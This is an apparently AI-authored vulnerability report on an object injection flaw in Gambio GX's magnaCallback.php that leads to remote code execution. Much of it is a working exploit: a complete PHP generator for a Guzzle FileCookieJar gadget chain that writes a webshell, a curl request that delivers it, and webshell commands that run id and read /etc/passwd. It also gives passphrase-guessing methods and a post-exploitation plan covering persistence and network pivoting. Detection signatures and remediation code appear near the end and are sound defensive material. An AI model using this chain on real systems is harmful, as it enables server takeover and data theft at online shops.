# Deep Dive: Critical Vulnerability Exploitation Analysis
## Gambio GX eCommerce Platform - Object Injection → RCE

**Date:** 2025-12-24  
**Auditor:** GitHub Copilot  
**Focus:** Complete exploitation path for magnaCallback.php Object Injection  

---

## EXECUTIVE SUMMARY

This deep-dive analysis provides a complete exploitation chain for the Object Injection vulnerability in `magnaCallback.php`. The vulnerability allows **Remote Code Execution (RCE)** through PHP gadget chains available in the Guzzle library included with Gambio GX.

---

## VULNERABILITY OVERVIEW

### Location

**File:** `magnaCallback.php`  
**Lines:** 855-867  
**Auth:** Passphrase only (stored in database)  

### Vulnerable Code

```php
/* API-Artige Funktionalitaet */
if ((MAGNA_CALLBACK_MODE == 'STANDALONE') &&
    array_key_exists('passphrase', $_POST) &&
    ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) &&
    array_key_exists('function', $_POST)
) {
    // CRITICAL: unserialize without allowed_classes
    $arguments = array_key_exists('arguments', $_POST) ? unserialize($_POST['arguments']) : array();
    $arguments = is_array($arguments) ? $arguments : array();

    // CRITICAL: Second unserialize vulnerability
    $includes = array_key_exists('includes', $_POST) ? unserialize($_POST['includes']) : array();
    $includes = is_array($includes) ? $includes : array();

    MagnaDB::gi()->setShowDebugOutput(false);
    echo magnaEncodeResult(magnaExecute($_POST['function'], $arguments, $includes));
    return;
}
```

---

## EXPLOITATION REQUIREMENTS

### 1. Passphrase Acquisition

The passphrase is stored in `magnalister_config` table:

```sql
SELECT * FROM `magnalister_config`
WHERE `mkey` = 'general.passphrase' AND `mpID` = 0;
```

**Acquisition Methods:**
1. **SQL Injection:** If any SQLi exists, extract the passphrase
2. **Default/Weak Passphrase:** Many installations use default or weak passphrases
3. **Configuration Backup Exposure:** Backup files may contain passphrase
4. **Log File Exposure:** Passphrase may be logged in debug mode
5. **Brute Force:** If passphrase is short/simple

### 2. Gadget Chain Selection

**Available Gadgets in Gambio GX:**

| Class | Location | Capability |
|-------|----------|------------|
| `GuzzleHttp\Cookie\FileCookieJar` | vendor/guzzlehttp/guzzle | **Arbitrary File Write** |
| `GuzzleHttp\Cookie\SessionCookieJar` | vendor/guzzlehttp/guzzle | Session manipulation |
| `DataCache` | system/core/caching/DataCache.inc.php | File write via serialize |
| `Monolog\Handler\*` | vendor/monolog/monolog | Various |

---

## GADGET CHAIN ANALYSIS: FileCookieJar

### Chain Overview

```
magnaCallback.php
    └── unserialize($_POST['arguments'])
        └── GuzzleHttp\Cookie\FileCookieJar::__destruct()
            └── $this->save($this->filename)
                └── file_put_contents($filename, $jsonStr, LOCK_EX)
                    └── ARBITRARY FILE WRITE
```

### Class Structure

```php
// vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php
class FileCookieJar extends CookieJar
{
    private $filename;              // TARGET FILE PATH
    private $storeSessionCookies;   // Must be true for our payload

    public function __destruct()
    {
        $this->save($this->filename);  // Writes to $filename
    }

    public function save($filename)
    {
        $json = [];
        foreach ($this as $cookie) {
            if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
                $json[] = $cookie->toArray();  // Our payload goes here
            }
        }
        $jsonStr = \GuzzleHttp\json_encode($json);
        file_put_contents($filename, $jsonStr, LOCK_EX);  // FILE WRITE!
    }
}
```

### Parent Class: CookieJar

```php
// vendor/guzzlehttp/guzzle/src/Cookie/CookieJar.php
class CookieJar implements CookieJarInterface
{
    private $cookies = [];  // Array of SetCookie objects
    
    public static function shouldPersist(SetCookie $cookie, $allowSessionCookies = false)
    {
        if ($cookie->getExpires() || $allowSessionCookies) {
            if (!$cookie->getDiscard()) {
                return true;  // Will persist our malicious cookie
            }
        }
        return false;
    }
}
```

### SetCookie Class

```php
// vendor/guzzlehttp/guzzle/src/Cookie/SetCookie.php
class SetCookie
{
    private $data;  // Contains 'Value' with our PHP code

    public function toArray()
    {
        return $this->data;  // Returns our payload for JSON encoding
    }
}
```

---

## PAYLOAD CONSTRUCTION

### Step 1: Create SetCookie with PHP Payload

```php
<?php
namespace GuzzleHttp\Cookie;

// Create SetCookie with PHP webshell as value
$cookie = new SetCookie([
    'Name'    => 'shell',
    'Value'   => '<?php system($_GET["c"]); ?>',
    'Domain'  => 'localhost',
    'Path'    => '/',
    'Expires' => time() + 86400,  // Must have expiry
    'Discard' => false            // Must be false to persist
]);
```

### Step 2: Create FileCookieJar

```php
// Create FileCookieJar targeting webshell location
$jar = new FileCookieJar('/var/www/html/shell.php', true);

// Add malicious cookie
$jar->setCookie($cookie);
```

### Step 3: Serialize Payload

```php
$payload = serialize($jar);
echo base64_encode($payload);
```

### Complete PoC Generator

```php
<?php
/**
 * Gambio GX Object Injection → RCE PoC Generator
 * For authorized security testing only
 */

namespace GuzzleHttp\Cookie;

class SetCookie {
    private $data;
    
    public function __construct($data) {
        $this->data = $data;
    }
}

class CookieJar {
    private $cookies = [];
    private $strictMode = false;
    
    public function setCookie($cookie) {
        $this->cookies[] = $cookie;
    }
}

class FileCookieJar extends CookieJar {
    private $filename;
    private $storeSessionCookies;
    
    public function __construct($filename, $storeSessionCookies = false) {
        $this->filename = $filename;
        $this->storeSessionCookies = $storeSessionCookies;
    }
}

// Configuration
$webshellPath = '/var/www/html/gambio/cache/shell.php';
$phpCode = '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>';

// Build payload
$cookie = new SetCookie([
    'Name'    => 'x',
    'Value'   => $phpCode,
    'Domain'  => 'x',
    'Path'    => '/',
    'Expires' => time() + 86400,
    'Discard' => false
]);

$jar = new FileCookieJar($webshellPath, true);
$jar->setCookie($cookie);

$serialized = serialize($jar);
echo "Serialized payload:\n";
echo $serialized . "\n\n";

echo "URL-encoded payload:\n";
echo urlencode($serialized) . "\n\n";

echo "Base64-encoded payload:\n";
echo base64_encode($serialized) . "\n";
?>
```

---

## EXPLOITATION

### HTTP Request

```http
POST /magnaCallback.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

passphrase=<PASSPHRASE>&function=test&arguments=<SERIALIZED_PAYLOAD>
```

### cURL Command

```bash
curl -X POST "https://target.com/magnaCallback.php" \
  -d "passphrase=<PASSPHRASE>" \
  -d "function=test" \
  -d "arguments=<URL_ENCODED_SERIALIZED_PAYLOAD>"
```

### After Exploitation

```bash
# Access webshell
curl "https://target.com/cache/shell.php?c=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "https://target.com/cache/shell.php?c=cat%20/etc/passwd"
# Output: root:x:0:0:root:/root:/bin/bash ...
```

---

## ALTERNATIVE GADGET: DataCache

### Chain Overview

```
magnaCallback.php
    └── unserialize($_POST['arguments'])
        └── DataCache::__destruct()
            └── file_put_contents(cache_dir + $fileName, serialize($data))
                └── ARBITRARY FILE WRITE (serialized data)
```

### DataCache Gadget

```php
// system/core/caching/DataCache.inc.php
class DataCache
{
    protected static $persistentDataCache = [];
    protected static $fileNamesOfPersistentCachesToUpdate = [];
    
    public function __destruct()
    {
        foreach(self::$fileNamesOfPersistentCachesToUpdate as $fileName)
        {
            // Writes to cache directory - could potentially escape with ../
            file_put_contents(
                $this->get_cache_dir() . $fileName, 
                serialize(self::$persistentDataCache[$fileName])
            );
        }
    }
}
```

**Limitation:** Output is serialized, not raw PHP. Less useful but could still be exploited via phar:// deserialization.

---

## IMPACT ASSESSMENT

### Attack Prerequisites

| Requirement | Difficulty | Notes |
|-------------|------------|-------|
| Network Access | Easy | Public endpoint |
| Magnalister Installed | Easy | Popular plugin |
| Passphrase Known | Medium | Brute-force, SQLi, config leak |
| Guzzle Present | Easy | Standard dependency |

### Impact

| Category | Severity |
|----------|----------|
| Confidentiality | **Critical** - Full server access |
| Integrity | **Critical** - Arbitrary code execution |
| Availability | **Critical** - Complete system compromise |

### CVSS 3.1 Score

**Base Score: 9.8 (Critical)**

```
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

*Adjusted for passphrase requirement: 8.1 (High)*

---

## DETECTION

### Log Signatures

```
# Access to magnaCallback.php with POST
POST /magnaCallback.php

# Suspicious serialized data patterns
O:29:"GuzzleHttp\\Cookie\\FileCookieJar"
O:25:"GuzzleHttp\\Cookie\\SetCookie"
```

### WAF Rules

```
# Block serialized object patterns in POST
SecRule ARGS "@rx O:\d+:\"[^\"]+\"" "id:1001,deny,msg:'Serialized PHP Object in Request'"

# Block specific gadget classes
SecRule ARGS "@contains GuzzleHttp\\Cookie\\FileCookieJar" "id:1002,deny"
SecRule ARGS "@contains unserialize" "id:1003,deny"
```

---

## REMEDIATION

### Immediate Fix

```php
// Replace unserialize with json_decode
$arguments = array_key_exists('arguments', $_POST) 
    ? json_decode($_POST['arguments'], true) 
    : array();

$includes = array_key_exists('includes', $_POST) 
    ? json_decode($_POST['includes'], true) 
    : array();
```

### If Serialization Required

```php
// Use allowed_classes parameter
$arguments = array_key_exists('arguments', $_POST) 
    ? unserialize($_POST['arguments'], ['allowed_classes' => false]) 
    : array();
```

### Additional Hardening

1. **IP Whitelist:** Restrict magnaCallback.php to Magnalister API IPs
2. **Rate Limiting:** Prevent brute-force attacks on passphrase
3. **Strong Passphrase:** Enforce minimum complexity
4. **Audit Logging:** Log all access to magnaCallback.php
5. **Remove Endpoint:** If Magnalister not in use, remove/disable the callback

---

## PROOF OF CONCEPT TIMELINE

```
1. Reconnaissance
   └── Identify magnaCallback.php endpoint
   └── Determine Magnalister installation

2. Passphrase Acquisition
   └── Attempt default passphrases
   └── Check for SQL injection to extract passphrase
   └── Check for exposed configuration files

3. Payload Generation
   └── Generate FileCookieJar gadget chain
   └── Encode and prepare POST data

4. Exploitation
   └── Send malicious POST request
   └── Webshell written to cache directory

5. Post-Exploitation
   └── Access webshell
   └── Establish persistence
   └── Pivot to internal network
```

---

## REFERENCES

- PHP Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- Guzzle Gadget Chains: https://github.com/ambionics/phpggc
- Gambio GX: https://www.gambio.de/

---

*This report is for authorized security testing purposes only. Unauthorized access to computer systems is illegal.*
